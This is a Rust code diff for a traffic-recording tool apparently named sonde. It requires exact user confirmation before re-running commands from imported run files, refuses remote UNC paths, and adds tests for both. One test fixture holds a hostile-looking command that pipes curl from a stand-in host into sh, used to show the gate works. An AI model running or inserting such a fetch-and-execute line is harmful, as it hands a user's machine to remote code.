@@ -118,46 +118,14 @@ enum CodeTarget {
     Reveal(PathBuf),
 }
 
-/// What a press may open: source and text, which the system shows in an
-/// editor. Anything else (programs, scripts, shortcuts, installers, a file
-/// with no extension) is shown in the file manager, never opened.
-const OPENS: &[&str] = &[
-    "py", "js", "ts", "tsx", "jsx", "mjs", "cjs", "java", "kt", "go", "rs", "rb", "c", "h", "cpp",
-    "cs", "scala", "sql", "toml", "yaml", "yml", "json", "md", "txt", "xml",
-];
-
-/// Of [`OPENS`], what Windows runs when opened (Windows Script Host, an
-/// installed Python or Ruby): shown there, not opened.
-const RUNS_ON_WINDOWS: &[&str] = &["js", "py", "rb"];
-
-fn opens(ext: &str, windows: bool) -> bool {
-    let e = ext.to_ascii_lowercase();
-    OPENS.contains(&e.as_str()) && !(windows && RUNS_ON_WINDOWS.contains(&e.as_str()))
-}
-
-/// A path on another machine (`\\host\share`, `//host/share`,
-/// `\\?\UNC\…`): even looking at it reaches out to that host.
-fn remote(path: &str) -> bool {
-    let p = path.replace('/', "\\");
-    match p.strip_prefix("\\\\") {
-        // `\\?\C:\…` and `\\.\…` are this machine's, unless they spell UNC
-        Some(rest) => match rest
-            .strip_prefix("?\\")
-            .or_else(|| rest.strip_prefix(".\\"))
-        {
-            Some(local) => local.to_ascii_uppercase().starts_with("UNC\\"),
-            None => true,
-        },
-        None => false,
-    }
-}
-
 /// The file `place` names, inside `dir`: opened when it is a regular file
-/// there whose type is source or text ([`OPENS`]); shown in the file
-/// manager otherwise. `dir` and `place` both come from the run file,
-/// which may be someone else's: a folder on another machine is refused,
-/// and a folder that is a whole disk is no folder to be "inside" of.
+/// there whose type is source or text ([`sonde_analysis::code::opens`]);
+/// shown in the file manager otherwise. `dir` and `place` both come from
+/// the run file, which may be someone else's: a folder on another machine
+/// is refused, and a folder that is a whole disk is no folder to be
+/// "inside" of.
 fn code_target(dir: &Path, place: &str) -> Result<CodeTarget, String> {
+    use sonde_analysis::code::{self, Refused};
     // `file:line function`: a path may hold spaces and a drive's colon
     let named = sonde_proxy::callers::code_place(place);
     let file = match &named {
@@ -167,41 +135,22 @@ fn code_target(dir: &Path, place: &str) -> Result<CodeTarget, String> {
     if file.is_empty() {
         return Err(err_msg("the place names no file"));
     }
-    // before anything touches the path: canonicalize would contact the host
-    if remote(&dir.to_string_lossy()) || remote(file) {
-        return Err(err_msg(
-            "the run names a folder on another machine: not opened",
-        ));
-    }
-    let root = dir
-        .canonicalize()
-        .map_err(|e| err_msg(format!("{}: {e}", dir.display())))?;
-    // a canonical root on Windows is verbatim (`\\?\C:\…`), where `/` is no
-    // separator: a place written `etl/load.py` is joined as `etl\load.py`
-    let file = if cfg!(windows) {
-        std::borrow::Cow::Owned(file.replace('/', "\\"))
-    } else {
-        std::borrow::Cow::Borrowed(file)
-    };
-    let candidate = Path::new(file.as_ref());
-    let joined = if candidate.is_absolute() {
-        candidate.to_path_buf()
-    } else {
-        root.join(candidate)
-    };
-    let full = joined
-        .canonicalize()
-        .map_err(|_| err_msg(format!("{} is not there", joined.display())))?;
-    let source = full
+    let found = code::find(dir, file).map_err(|e| {
+        err_msg(match e {
+            Refused::Remote => "the run names a folder on another machine: not opened".to_string(),
+            Refused::NoFolder(dir, why) => format!("{}: {why}", dir.display()),
+            Refused::Missing(file) => format!("{} is not there", file.display()),
+        })
+    })?;
+    let source = found
+        .path
         .extension()
         .and_then(|e| e.to_str())
-        .is_some_and(|e| opens(e, cfg!(windows)));
-    let inside = root.parent().is_some() && full.starts_with(&root);
-    let regular = full.metadata().map(|m| m.is_file()).unwrap_or(false);
-    Ok(if inside && regular && source {
-        CodeTarget::Open(full)
+        .is_some_and(|e| code::opens(e, cfg!(windows)));
+    Ok(if found.inside && source {
+        CodeTarget::Open(found.path)
     } else {
-        CodeTarget::Reveal(full)
+        CodeTarget::Reveal(found.path)
     })
 }
 
@@ -583,6 +532,11 @@ fn view_of(path: &str) -> Result<JsonValue, String> {
         "sdk".into(),
         json!(sonde_proxy::callers::sdk_of(&s.records)),
     );
+    // where its file came from: its command is the user's own only when
+    // sonde recorded it here
+    if origin(path) == Origin::Elsewhere {
+        view.insert("external".into(), json!(true));
+    }
     Ok(with_trials(JsonValue::Object(view), path))
 }
 
@@ -686,6 +640,185 @@ fn own_run_in(dir: &Path, path: &str) -> Result<String, String> {
     // as the list names it (a dropped file's path may be spelled otherwise:
     // forward slashes on Windows, a symlinked folder)
     Ok(name)
+}
+
+/// Where a run's file came from: what decides whether its command may be
+/// started on its word alone.
+#[derive(Debug, Clone, Copy, PartialEq)]
+enum Origin {
+    /// Recorded by this sonde into its runs folder.
+    Recorded,
+    /// Anyone's: a file elsewhere on the disk, or one opened from elsewhere
+    /// (a drop, a link, the system's Open, the picker) and kept as a copy.
+    Elsewhere,
+}
+
+/// [`Origin`] of the run at `path`, for the runs directory `dir`. Decided
+/// from where the file really is (links followed) and from what the
+/// folder's index says was imported, never from anything in the file, which
+/// whoever made it wrote: only a regular `.sonde` file directly in `dir`
+/// that is no import was recorded here. (A trial's run, in `trials/`, is
+/// not a run to start again.)
+fn origin_in(dir: &Path, path: &Path) -> Origin {
+    let (Ok(file), Ok(dir)) = (path.canonicalize(), dir.canonicalize()) else {
+        return Origin::Elsewhere;
+    };
+    let name = file
+        .file_name()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let inside = file.parent() == Some(dir.as_path()) && name.ends_with(".sonde") && file.is_file();
+    let imported = || {
+        sonde_analysis::index::of(&dir)
+            .folder
+            .imports
+            .values()
+            .any(|n| *n == name)
+    };
+    if inside && !imported() {
+        Origin::Recorded
+    } else {
+        Origin::Elsewhere
+    }
+}
+
+/// [`origin_in`] the runs directory.
+fn origin(path: &str) -> Origin {
+    origin_in(&sonde().paths().runs(), Path::new(path))
+}
+
+/// The refusal to start the command of a run from elsewhere: `kind:
+/// "confirm"`, with the command and the folder exactly as they would run,
+/// for the app to ask the user about.
+fn confirm_first(command: &str, cwd: Option<&str>) -> String {
+    json!({
+        "sonde": true,
+        "kind": "confirm",
+        "message": "this run came from elsewhere: its command runs only once you have read and confirmed it",
+        "command": command,
+        "cwd": cwd,
+    })
+    .to_string()
+}
+
+/// Whether the command of a run of `origin` may start: one recorded here
+/// may; one from elsewhere only when the call carries what the user was
+/// shown and confirmed (`confirmed`: `{ command, cwd }`), and that is, to
+/// the character, the `command` and `cwd` that would run. Anything else
+/// (nothing, another command, the same one as a list shows it with its
+/// values hidden) is refused with [`confirm_first`].
+fn may_start(
+    origin: Origin,
+    command: &str,
+    cwd: Option<&str>,
+    confirmed: &JsonValue,
+) -> Result<(), String> {
+    if origin == Origin::Recorded {
+        return Ok(());
+    }
+    let same = confirmed.is_object()
+        && confirmed.get("command").and_then(|c| c.as_str()) == Some(command)
+        && confirmed.get("cwd").and_then(|c| c.as_str()) == cwd;
+    if same {
+        Ok(())
+    } else {
+        Err(confirm_first(command, cwd))
+    }
+}
+
+/// What running the run at `path` again starts, read from its file here
+/// (the interface names the run, never the command): its command, the
+/// folder it ran in and its endpoint. Refused for a run of no command, and
+/// for one from elsewhere ([`origin_in`] `dir`) until confirmed
+/// ([`may_start`]).
+fn again_in(
+    dir: &Path,
+    path: &str,
+    confirmed: &JsonValue,
+) -> Result<(String, Option<String>, String), String> {
+    let h = header_of(Path::new(path)).ok_or_else(|| err_msg(format!("{path}: no run to read")))?;
+    let command = h
+        .command
+        .clone()
+        .filter(|c| h.scenario.is_none() && sonde_analysis::program::program_key(Some(c)).is_some())
+        .ok_or_else(|| err_msg("only a run of a command can be run again"))?;
+    may_start(
+        origin_in(dir, Path::new(path)),
+        &command,
+        h.cwd.as_deref(),
+        confirmed,
+    )?;
+    Ok((command, h.cwd, h.endpoint))
+}
+
+/// Adds a run file's text to the runs directory `dir` as [`Runs::import`]
+/// says. It is marked as an import in the folder's index before it is
+/// there: a file that could not be marked is not kept, so no copy of
+/// someone else's run is ever taken for one recorded here ([`origin_in`]).
+fn import_in(dir: &Path, name: &str, text: &str) -> Result<String, String> {
+    std::fs::create_dir_all(dir).map_err(err_msg)?;
+    let stem: String = Path::new(name)
+        .file_stem()
+        .map(|s| s.to_string_lossy().into_owned())
+        .unwrap_or_default()
+        .chars()
+        .map(|c| {
+            if c.is_alphanumeric() || "-_.".contains(c) {
+                c
+            } else {
+                '-'
+            }
+        })
+        .collect();
+    let stem = if stem.is_empty() {
+        "imported".to_string()
+    } else {
+        stem
+    };
+    // the same file opened again is the run it made, not a copy
+    let digest = format!("{:016x}", fnv1a(text.as_bytes()));
+    if let Some(p) = sonde_analysis::index::of(dir)
+        .folder
+        .imports
+        .get(&digest)
+        .map(|n| dir.join(n))
+        .filter(|p| p.is_file())
+    {
+        return Ok(p.to_string_lossy().into_owned());
+    }
+    let path = sonde_analysis::run::fresh_path(dir, &stem);
+    let kept = path
+        .file_name()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let mark = |to: Option<String>| {
+        sonde_analysis::index::update(dir, |_| {
+            (
+                vec![(digest.clone(), sonde_analysis::index::Change::Import(to))],
+                (),
+            )
+        })
+    };
+    mark(Some(kept)).map_err(|e| err_msg(format!("{name}: not opened: {e}")))?;
+    // production traffic: an access log, CloudTrail events, a HAR
+    let written = if sonde_analysis::import::detect(text).is_some() {
+        sonde_analysis::import::import(text, &stem)
+            .and_then(|(_, run)| sonde_analysis::import::save(&run, &path).map_err(err_msg))
+    } else {
+        reqlog::private::write(&path, text)
+            .map_err(err_msg)
+            .and_then(|()| {
+                RunFile::open(&path)
+                    .map(|_| ())
+                    .map_err(|e| format!("{name}: {e}"))
+            })
+    };
+    if let Err(e) = written {
+        let _ = std::fs::remove_file(&path);
+        let _ = mark(None);
+        return Err(e);
+    }
+    Ok(path.to_string_lossy().into_owned())
 }
 
 /// Keeps the exit code a run ended with in its folder's index (a killed
@@ -1845,6 +1978,38 @@ impl Runs {
         Ok(json!({ "exit": code, "path": path }))
     }
 
+    /// Runs the command of the run at `path` again, in the folder it ran in,
+    /// on its endpoint, as [`Runs::run`] runs one typed into the command
+    /// bar. The command is read from the run's file here. A run sonde did
+    /// not record into its runs folder (opened from a file, a link, a
+    /// drop) is anyone's: its command starts only when `confirmed` is
+    /// `{ command, cwd }` exactly as they would run, which the app sends
+    /// once the user has read them and said yes; otherwise the call is
+    /// refused with `kind: "confirm"` and those two, to ask with.
+    pub async fn run_again(
+        path: String,
+        cols: f64,
+        rows: f64,
+        confirmed: JsonValue,
+        #[args(event)] output: Callback<JsonValue>,
+    ) -> Result<JsonValue, String> {
+        let (command, cwd, endpoint) = again_in(&sonde().paths().runs(), &path, &confirmed)?;
+        let (code, path) = run_recorded(
+            &command,
+            cwd.as_deref(),
+            endpoint,
+            "allow".into(),
+            cols,
+            rows,
+            &output,
+            None,
+            true,
+        )
+        .await?;
+        keep_exit(&path, code);
+        Ok(json!({ "exit": code, "path": path }))
+    }
+
     /// Text for the running program (what the user typed into its terminal).
     pub fn input(data: String) -> bool {
         RUNNING
@@ -1890,12 +2055,14 @@ impl Runs {
 
     /// What trying a run's program under faults would run, said before
     /// it runs: `{ command, cwd, scenarios: [{ name, about, maxTimes }], project,
-    /// sharesPlace, confirmPlace, cleanExit }`. `project`: the scenarios are
-    /// the `sonde.toml`'s own; `sharesPlace`: the run writes, and neither
-    /// `{trial}` in the command nor `SONDE_TRIAL` in its keys gives each run
-    /// a place, so every run would write where the clean run wrote;
-    /// `confirmPlace`: and the store is not the demo's, so [`Runs::trial`]
-    /// refuses the trial unless told `same_place`;
+    /// sharesPlace, confirmPlace, cleanExit, external }`. `external`: the run
+    /// was not recorded here, and [`Runs::trial`] wants its command
+    /// confirmed. `project`: the scenarios are the `sonde.toml`'s own;
+    /// `sharesPlace`: the run writes, and neither `{trial}` in the command
+    /// nor `SONDE_TRIAL` in its keys gives each run a place, so every run
+    /// would write where the clean run wrote; `confirmPlace`: and the store
+    /// is not the demo's, so [`Runs::trial`] refuses the trial unless told
+    /// `same_place`;
     /// `cleanExit` null when the run's exit code was not kept (0 is assumed).
     pub fn trial_plan(path: String) -> Result<JsonValue, String> {
         let s = open_run(&path)?;
@@ -1919,6 +2086,7 @@ impl Runs {
             "sharesPlace": plan.shares_place,
             "confirmPlace": shares_place(&plan, &s),
             "cleanExit": sonde_analysis::index::get(Path::new(&path)).exit,
+            "external": origin(&path) == Origin::Elsewhere,
         }))
     }
 
@@ -1933,7 +2101,9 @@ impl Runs {
     /// cancels, and a cancelled trial keeps nothing. The run's earlier
     /// verdicts are replaced. What the program may do is `policy`'s. A
     /// trial whose runs would all write to one place (the plan's
-    /// `confirmPlace`) is refused unless `same_place` asks for it.
+    /// `confirmPlace`) is refused unless `same_place` asks for it. The
+    /// command of a run that was not recorded here starts only with
+    /// `confirmed`, as [`Runs::run_again`]'s.
     pub async fn trial(
         path: String,
         scenarios: Vec<String>,
@@ -1941,6 +2111,7 @@ impl Runs {
         same_place: bool,
         cols: f64,
         rows: f64,
+        confirmed: JsonValue,
         #[args(event)] output: Callback<JsonValue>,
     ) -> Result<JsonValue, String> {
         // a run of the runs directory: its trials are kept beside it
@@ -1949,6 +2120,12 @@ impl Runs {
         let plan = sonde_analysis::trial_plan::of(&clean).map_err(err_msg)?;
         let chosen = plan.named(&scenarios).map_err(err_msg)?;
         policy_of(&policy)?;
+        may_start(
+            origin(&path),
+            &plan.command,
+            plan.cwd.as_deref(),
+            &confirmed,
+        )?;
         if shares_place(&plan, &clean) && !same_place {
             return Err(err_msg(SHARES_PLACE));
         }
@@ -2463,62 +2640,10 @@ impl Runs {
     }
 
     /// Adds a run file the user picked (its name and text) to the
-    /// runs directory, if it reads as one; its new path.
+    /// runs directory, if it reads as one; its new path. The copy stays
+    /// someone else's run ([`Origin::Elsewhere`]).
     pub fn import(name: String, text: String) -> Result<String, String> {
-        let dir = sonde().paths().runs();
-        std::fs::create_dir_all(&dir).map_err(err_msg)?;
-        let stem: String = Path::new(&name)
-            .file_stem()
-            .map(|s| s.to_string_lossy().into_owned())
-            .unwrap_or_default()
-            .chars()
-            .map(|c| {
-                if c.is_alphanumeric() || "-_.".contains(c) {
-                    c
-                } else {
-                    '-'
-                }
-            })
-            .collect();
-        let stem = if stem.is_empty() {
-            "imported".to_string()
-        } else {
-            stem
-        };
-        // the same file opened again is the run it made, not a copy
-        let digest = format!("{:016x}", fnv1a(text.as_bytes()));
-        let _ = std::fs::create_dir_all(&dir);
-        if let Some(p) = sonde_analysis::index::of(&dir)
-            .folder
-            .imports
-            .get(&digest)
-            .map(|n| dir.join(n))
-            .filter(|p| p.is_file())
-        {
-            return Ok(p.to_string_lossy().into_owned());
-        }
-        let path = sonde_analysis::run::fresh_path(&dir, &stem);
-        // production traffic: an access log, CloudTrail events, a HAR
-        if sonde_analysis::import::detect(&text).is_some() {
-            let (_, run) = sonde_analysis::import::import(&text, &stem)?;
-            sonde_analysis::import::save(&run, &path).map_err(err_msg)?;
-        } else {
-            reqlog::private::write(&path, text).map_err(err_msg)?;
-            if let Err(e) = RunFile::open(&path) {
-                let _ = std::fs::remove_file(&path);
-                return Err(format!("{name}: {e}"));
-            }
-        }
-        if let Some(n) = path.file_name() {
-            let n = n.to_string_lossy().into_owned();
-            let _ = sonde_analysis::index::update(&dir, |_| {
-                (
-                    vec![(digest, sonde_analysis::index::Change::Import(Some(n)))],
-                    (),
-                )
-            });
-        }
-        Ok(path.to_string_lossy().into_owned())
+        import_in(&sonde().paths().runs(), &name, &text)
     }
 
     /// The system's open dialog for a run or a log of traffic (`kinds`:
@@ -2851,6 +2976,7 @@ mod tests {
             assert_eq!(target(n), CodeTarget::Reveal(root.join(n)), "{n}");
         }
         // what Windows runs when opened is shown there
+        use sonde_analysis::code::opens;
         assert!(opens("py", false) && !opens("py", true));
         assert!(opens("JS", false) && !opens("js", true));
         assert!(opens("rs", true) && !opens("exe", false));
@@ -2858,6 +2984,7 @@ mod tests {
 
     #[test]
     fn a_run_that_names_a_folder_elsewhere_opens_nothing() {
+        use sonde_analysis::code::remote;
         assert!(remote(r"\\host\share\etl"));
         assert!(remote("//host/share"));
         assert!(remote(r"\\?\UNC\host\share"));
@@ -3623,6 +3750,140 @@ mod tests {
         let (elsewhere, _, _) = run_and_trial(other.path(), "python job.py", None);
         let e = own_run_in(dir.path(), &elsewhere).unwrap_err();
         assert!(e.contains("is not one of sonde's runs"), "{e}");
+    }
+
+    /// A run's command is started on the run's word alone only when sonde
+    /// recorded the run into its runs folder: where the file really is, and
+    /// the index's list of imports, decide it; nothing in the file does.
+    #[test]
+    fn only_a_run_recorded_into_the_runs_folder_is_sondes_own() {
+        let data = tempfile::tempdir().unwrap();
+        let dir = data.path().join("runs");
+        let (recorded, trial, _) = run_and_trial(&dir, "python job.py", None);
+        assert_eq!(origin_in(&dir, Path::new(&recorded)), Origin::Recorded);
+        // however its path is spelled
+        let spelled = dir
+            .join("trials")
+            .join("..")
+            .join("20260101-000000-job.sonde");
+        assert_eq!(origin_in(&dir, &spelled), Origin::Recorded);
+        // a trial's run is not a run to start again
+        assert_eq!(origin_in(&dir, Path::new(&trial)), Origin::Elsewhere);
+        // a file elsewhere on the disk, the same bytes
+        let other = tempfile::tempdir().unwrap();
+        let text = std::fs::read_to_string(&recorded).unwrap();
+        let outside = other.path().join("20260101-000000-job.sonde");
+        std::fs::write(&outside, &text).unwrap();
+        assert_eq!(origin_in(&dir, &outside), Origin::Elsewhere);
+        // opened from there, its copy is in the runs folder and still not sonde's
+        // own: the folder's index says it was imported
+        let copy = import_in(&dir, "20260101-000000-job.sonde", &text).unwrap();
+        assert_eq!(
+            Path::new(&copy).parent().unwrap().canonicalize().unwrap(),
+            dir.canonicalize().unwrap()
+        );
+        assert_ne!(copy, recorded);
+        assert_eq!(origin_in(&dir, Path::new(&copy)), Origin::Elsewhere);
+        // (opened again, it is that copy, and the run recorded here is still its own)
+        assert_eq!(import_in(&dir, "again.sonde", &text).unwrap(), copy);
+        assert_eq!(origin_in(&dir, Path::new(&recorded)), Origin::Recorded);
+        // a file that says of itself that it is sonde's own: said by the file, not believed
+        let lying = text.replacen("{", "{\"origin\":\"recorded\",\"external\":false,", 1);
+        let copy = import_in(&dir, "mine.sonde", &lying).unwrap();
+        assert_eq!(origin_in(&dir, Path::new(&copy)), Origin::Elsewhere);
+        // a link in the runs folder to a file elsewhere is the file elsewhere
+        #[cfg(unix)]
+        {
+            let link = dir.join("linked.sonde");
+            std::os::unix::fs::symlink(&outside, &link).unwrap();
+            assert_eq!(origin_in(&dir, &link), Origin::Elsewhere);
+        }
+        // nothing there, no run, another folder's
+        assert_eq!(origin_in(&dir, &dir.join("gone.sonde")), Origin::Elsewhere);
+        assert_eq!(origin_in(&dir, &dir), Origin::Elsewhere);
+        assert_eq!(
+            origin_in(other.path(), Path::new(&recorded)),
+            Origin::Elsewhere
+        );
+    }
+
+    /// The command of a run from elsewhere is not started by Run again or a
+    /// trial until the call carries the user's yes to exactly that command
+    /// in exactly that folder; the refusal says both, as they would run.
+    #[test]
+    fn a_run_from_elsewhere_starts_nothing_until_its_exact_command_is_confirmed() {
+        let data = tempfile::tempdir().unwrap();
+        let dir = data.path().join("runs");
+        // (a command whose list form hides what it runs)
+        let command = "TOKEN=\"$(curl -s https://example.invalid/x | sh)\" python job.py";
+        let cwd = data.path().join("work");
+        std::fs::create_dir_all(&cwd).unwrap();
+        let (recorded, _, _) = run_and_trial(&dir, command, Some(&cwd));
+        let cwd = cwd.to_string_lossy().into_owned();
+        let ran = (command.to_string(), Some(cwd.clone()), "ep".to_string());
+        // recorded here: it runs again as it did, unasked
+        assert_eq!(again_in(&dir, &recorded, &JsonValue::Null), Ok(ran.clone()));
+        // the same run, opened from a file: a copy in the runs folder
+        let text = std::fs::read_to_string(&recorded).unwrap();
+        let copy = import_in(&dir, "theirs.sonde", &text).unwrap();
+        let refused = |confirmed: JsonValue| -> JsonValue {
+            let e = again_in(&dir, &copy, &confirmed).unwrap_err();
+            serde_json::from_str(&e).unwrap()
+        };
+        let e = refused(JsonValue::Null);
+        assert_eq!(e["kind"], "confirm", "{e}");
+        // what to ask about: the command and the folder, unscrubbed
+        assert_eq!(e["command"], command, "{e}");
+        assert_eq!(e["cwd"], cwd.as_str(), "{e}");
+        // a yes to something else is no yes: the command as a list shows it,
+        // another folder, no folder, a bare `true`
+        for other in [
+            json!({ "command": "TOKEN=… python job.py", "cwd": cwd }),
+            json!({ "command": command, "cwd": "/" }),
+            json!({ "command": command }),
+            json!({ "command": command, "cwd": null }),
+            json!({ "command": format!("{command} "), "cwd": cwd }),
+            json!(true),
+            json!([command, cwd]),
+        ] {
+            assert_eq!(refused(other.clone())["kind"], "confirm", "{other}");
+        }
+        // the exact command in the exact folder, confirmed: it starts
+        let yes = json!({ "command": command, "cwd": cwd });
+        assert_eq!(again_in(&dir, &copy, &yes), Ok(ran.clone()));
+        // a file elsewhere on the disk is held to the same
+        let outside = data.path().join("elsewhere.sonde");
+        std::fs::copy(&recorded, &outside).unwrap();
+        let outside = outside.to_string_lossy().into_owned();
+        assert!(again_in(&dir, &outside, &JsonValue::Null).is_err());
+        assert_eq!(again_in(&dir, &outside, &yes), Ok(ran));
+        // and so is a trial, by the same gate
+        assert!(may_start(Origin::Elsewhere, command, Some(&cwd), &JsonValue::Null).is_err());
+        assert!(may_start(Origin::Elsewhere, command, Some(&cwd), &yes).is_ok());
+        assert!(may_start(Origin::Recorded, command, Some(&cwd), &JsonValue::Null).is_ok());
+        // a run with no folder: confirmed with none, never with one
+        assert!(
+            may_start(
+                Origin::Elsewhere,
+                "x",
+                None,
+                &json!({ "command": "x", "cwd": null })
+            )
+            .is_ok()
+        );
+        assert!(
+            may_start(
+                Origin::Elsewhere,
+                "x",
+                None,
+                &json!({ "command": "x", "cwd": "" })
+            )
+            .is_err()
+        );
+        // sonde's own words are no command to run again
+        let (replay, _, _) = run_and_trial(&data.path().join("more"), "replay of a.sonde", None);
+        let e = again_in(&data.path().join("more"), &replay, &JsonValue::Null).unwrap_err();
+        assert!(e.contains("only a run of a command"), "{e}");
     }
 
     /// The bridge's own path for a large run, timed: what a window
